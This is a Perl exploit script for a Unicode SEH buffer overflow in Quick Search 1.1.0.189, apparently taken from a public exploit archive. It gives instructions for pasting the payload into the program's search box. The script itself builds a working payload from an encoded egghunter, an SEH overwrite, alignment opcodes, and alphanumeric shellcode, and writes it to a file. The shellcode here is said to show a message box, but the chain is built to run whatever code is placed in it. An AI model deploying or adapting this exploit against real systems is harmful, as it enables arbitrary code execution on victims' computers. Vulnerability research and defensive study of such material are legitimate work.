#!/usr/bin/perl

###########################################################################=
#######################
# Exploit Title: Quick Search 1.1.0.189 'search textbox' Unicode SEH egghunter Buffer Overflow
# Date: 2015-04-23
# Exploit Author: Tomislav Paskalev
# Vulnerable Software: Quick Search v1.1.0.189
# Vendor Homepage: http://www.glarysoft.com/
# Software Link: https://www.exploit-db.com/apps/93feb6805c08d3ca84b0636a3a986a56-qsearchsetup.exe
# Version: 1.1.0.189
# Tested on: Windows XP SP2 EN
# OSVDB-ID: 93445
###########################################################################=
#######################
# Credits:
# - Vulnerability identified by ariarat
#   http://www.exploit-db.com/exploits/25443/
###########################################################################=
#######################
# Exploit development notes:
# - instead of attaching the process, start the executable within the debugger
#   - the application's module gtms_D7.bpl was not compiled with SafeSEH
#     - since this is a unicode buffer overflow \x00 will not terminate the string
#       - 6 available unicode friendly P/P/R pointers within the module
#         - this exploit should work across different OS versions
#           (tested only on Win XP SP2 EN)
#   - several other unicode friendly aplication modules are available, but have not been checked
###########################################################################=
#######################
# How to exploit:
# - Quick Search -> (click arrow for menu) Match Path -> (click arrow for menu) Full Mode ->=20
#   (paste created exploit string into the search textbox)
#   - once the exploit string is pasted, the egghunter starts to search the memory for the marker
#     - on my test machine the search takes around 30 seconds (until the shellcode gets executed)
#       - during the search the mouse cursor will NOT have a hourglass displayed beside it
#       - during the search the application will NOT become unresponsive (i.e. it will be usable)
###########################################################################=
#######################
# Thanks to:
# - ariarat (PoC)
# - Peter Van Eeckhoutte (exploit development tutorials)
# - Offensive Security (IT security courses, admin support)
###########################################################################=
#######################

my $junk = "A" x 21;

# Egghunter code; NtAccessCheckAndAuditAlarm method; searches for "0t0t"
# msfencode -e x86/alpha_mixed
# msfencode -e x86/unicode_upper BufferRegister=EAX
# converted to ASCII
my $egghunter =
"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ" .
"11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944J" .
"B9KHHHYCDO4KD1KB3QIQ9OY190IQ9PIQ9PI0IOS13PCPC1313PCOGB11J2J11R8R" .
"0P01100OQRK11OQB102Q1OR02PB0BNP0BORQ11228PPP8Q1PBT50JQ9RUOF0M212" .
"J1Z3IRO3F2O41QB1VP2S20J26RBP3BHRZ2MBVPNRGPLCCOESBCJ2C14482O2O18B" .
"52000P02EB032PTBNBKR92J0L2OBR1E3ICJPLRO0B0URZ0G2KPO1I2W11Q1AA";

my $fill = "C" x (1045 - length($junk.$egghunter));
my $nextSEH = "\x41\x6d";                       # INC ECX; INSW Yz DX
my $SEH = "\x70\x34";                           # POP POP RET from gtms_D7.bpl

# jump to egghunter code
my $allign = "\x58";                            # POP EAX
$allign = $allign."\x6d";                       # NOP/remove NULL bytes
$allign = $allign."\x58";                       # POP EAX
$allign = $allign."\x6d";                       # NOP/remove NULL bytes
$allign = $allign."\x58";                       # POP EAX
$allign = $allign."\x6d";                       # NOP/remove NULL bytes
$allign = $allign."\x05\x01\x11";               # ADD EAX, 0x11000100
$allign = $allign."\x6d";                       # NOP/remove NULL bytes
$allign = $allign."\x2d\x09\x11";               # SUB EAX, 0x11000900
$allign = $allign."\x6d";                       # NOP/remove NULL bytes
my $jumptoegghunter = "\x50";                   # PUSH EAX
$jumptoegghunter = $jumptoegghunter."\x6d";     # NOP/remove NULL bytes
$jumptoegghunter = $jumptoegghunter."\xc3";     # RETN

# fill the rest of the stack frame + padding (to avoid a memory area which coverts to upper alpha)
my $fill2 = "D" x 500;

# allign EAX and jump to shellcode
# (this gets executed after the marker is found)
my $allign2 = "\x6d";                           # NOP/remove NULL bytes
$allign2 = $allign2."\x57";                     # PUSH EDI
$allign2 = $allign2."\x6d";                     # NOP/remove NULL bytes
$allign2 = $allign2."\x58";                     # POP EAX
$allign2 = $allign2."\x6d";                     # NOP/remove NULL bytes
$allign2 = $allign2."\xb9\x1b\xaa";             # MOV ECX, 0xaa001b00
$allign2 = $allign2."\xe8";                     # ADD AL,CH (equivalent to adding "1b" (from the previous command)
                                                # to the last two bytes of EAX; i.e. increase EAX with "1b")
$allign2 = $allign2."\x6d";                     # NOP/remove NULL bytes
$allign2 = $allign2."\x50";                     # PUSH EAX
$allign2 = $allign2."\x6d";                     # NOP/remove NULL bytes
$allign2 = $allign2."\xc3";                     # RETN

# msfpayload windows/messagebox
# msfencode -e x86/alpha_mixed
# msfencode -e x86/unicode_upper BufferRegister=EAX
# converted to ASCII
my $shellcode =
"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ" .
"11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944J" .
"BYKWTHY44MTZTQNPV29190IQ919PI19PIOY19Q3Q3PC13Q3PC13070QPZ2JQ1B8R" .
"000Q10011RKOQQ10QOBOQ0BOBORQ200Q2Q2Q1Q2QHB0OHQ1Q2CEPJQ91JRY2XBKB" .
"MPKPI19S3Q4NVQ40J0TBT2QOZRR0N0RPPD70TT1RJC9OEP4PN2KNQQQPD400N2KN" .
"PSFQ4PLPNBKNT0615PL2NRKRPOV0418PNRKBSPNOW20PL0KBGQ6B51XPRRO2D0X0" .
"Q35PLP3NS1YB3P11H0Q49BOR92QRQ40RL0KBPRLBD340UD4RNBK010UQW0L2N2KN" .
"S343F18QBQHBFS1492Z0LPK0PPJB7QXBL0KBR3J2QNP33P1T8RKCJQ3OGPDQ3D9R" .
"NBKPTSDBL0KBFQQOX2N4621PK0OR0NQD9R02KPL0N0LRKNTPKRP0RB4162G2I21N" .
"XPO162M03NQ38OWNX2KQ9QTB7PKRSPL1QOD1F0HBQ2E2M01PNRK02CJ0UCDPF1QP" .
"JPKP5OFBLPK16RLR0PK0N2KQCQZC50L1EPQCHBK0NRK45PTBN2K1CP1QX1XPOD9Q" .
"ST4PE3DCE0LD3R1NX13NXP2C3NX1G1IBNODRK0948C5POSI2JQRQ5NX0L0NNR2N3" .
"F2NBJ0LR3BBPK0XBMPO492OCIBO29RO0OSIT7P52D0D0MRKC1RNPJD8PY422C0CB" .
"OBWSEPLP4341C2BB8QX0N2N0IBOQ92OD9BO2N1YPC45Q7RXNR0HB02L2PBLB1003" .
"7NQ0148RVPS2F1B342NOC0TPUNXODOE221CNRQ51312PKNXP10LQFOTQ62J0MB92" .
"MP61606NYBOBSBEBCODPLOYBO02CFNPPMBKPNOX2OQBC2BMPOPL2M0W1W2LNW24S" .
"112BK1H41T11YBO29BO2KPO130X2PQHNQ00P1P0QGB0NS0XNRCDQEP531BC43OTR" .
"0P12KRK0NRH410LD4BD45PT0LOY0JPCBBOXC2PNOF0N03BHPW0PR1D82PC1BDP43" .
"5P9OB0OB508ODP00B0LS2PI030SD508NQSD370PC3PQP040D5P8020OOEOI0B1DN" .
"PS5NUOHP31ER4OHPB0PT20L031HNS0D13B8BSB5NQ00P1BXQ70P3B0OPPQVBUT0S" .
"B18OBB4320E012HT4ODPCR8QU40R30SRBPO32PNORQ8P5D0QQQTOENXR2PEPP38B" .
"R0NPG20D0BIT0BNB5P80B251QS4T02IR0ROP038T30UP2B83CR5R3232B0HP20OR" .
"3B4P0C5R1NPB1SH0EP5T5P41WR0Q5P3BBQ8P3BW03B1OCQINPRNP4T1SJ2IPO3HT" .
"22LC724B3CBBN390MNQQ60QT912120J01R013C32CS1QS2B0KPOB8R03DBQ2K2PR" .
"PPP0KPOBB3E0FQXOQOQAA";

my $payload = $junk.$egghunter.$fill.$nextSEH.$SEH.$allign.$jumptoegghunter.$fill2."0t0t".$allign2.$shellcode;

open(myfile,'>QuickSearch_egghunter_messagebox.txt');
print myfile $payload;
close(myfile);
print "Wrote ".length($payload)." bytes\n";

